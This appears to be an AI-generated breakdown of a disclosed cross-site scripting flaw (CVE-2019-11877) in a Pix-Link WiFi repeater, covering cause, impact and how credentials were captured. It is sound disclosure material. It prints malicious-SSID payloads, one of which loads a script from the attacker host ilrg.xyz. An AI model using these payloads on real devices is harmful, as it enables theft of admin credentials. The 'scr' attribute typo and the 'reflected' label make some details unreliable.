Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2019-11877

**Root Cause of Vulnerability:** The Pix-Link LV-WR09 WiFi repeater is vulnerable to a Cross-Site Scripting (XSS) attack due to insufficient input sanitization when displaying available WiFi networks. Specifically, the repeater's firmware does not properly sanitize the SSID (network name) of available WiFi networks when listing them on the configuration page.

**Weaknesses/Vulnerabilities Present:**
*   **Reflected XSS:** The vulnerability is a reflected XSS, meaning the malicious script is injected via the SSID and executed in the victim's browser when the repeater's configuration page renders the list of available networks.

**Impact of Exploitation:**
*   **Credentials Stealing:** An attacker can inject malicious JavaScript code into the SSID. When a user accesses the repeater's configuration page and scans for available networks, the injected script executes within the user's browser session. This allows the attacker to:
    *   Capture user's credentials when they log into the repeater's admin interface.
    *   Potentially redirect the user to a phishing page or perform other malicious actions.
*   **Arbitrary Code Execution (in browser):** The attacker can execute arbitrary JavaScript code in the context of the user's browser when they visit the repeater's configuration page.

**Attack Vectors:**
*   **Malicious SSID:** The attacker creates a WiFi network with a specially crafted SSID containing JavaScript code. The SSID has a 32 character restriction.

**Required Attacker Capabilities/Position:**
*   **Proximity:** The attacker must be within range to broadcast a WiFi network with the malicious SSID.
*   **SSID Control:** The attacker must be able to control the SSID content, and this SSID must be discoverable by the targeted Pix-Link repeater.

**Technical Details:**
* The attacker crafted a malicious SSID such as  `"<script>alert('XSS')</script>"`.
* When the Pix-Link repeater scanned for available networks, the javascript in the SSID was executed on the browser of a user who accessed the repeater configuration page.
* The attacker then shortened the domain name to `ilrg.xyz` and changed the SSID to `"<script scr=//ilrg.xyz></script>"`. Then a script at the attackers server `ilrg.xyz/index.html` was executed in the context of the browser of the victim.
* The attacker captured the credentials by sending the data to a file on the attackers server.

**Additional Notes:**

*   The vendor was notified multiple times but did not respond, leading to public disclosure.
*   The provided information was for a specific Pix-Link repeater model (LV-WR09), but similar vulnerabilities might be present in other models from the same vendor if they have the same vulnerable code.
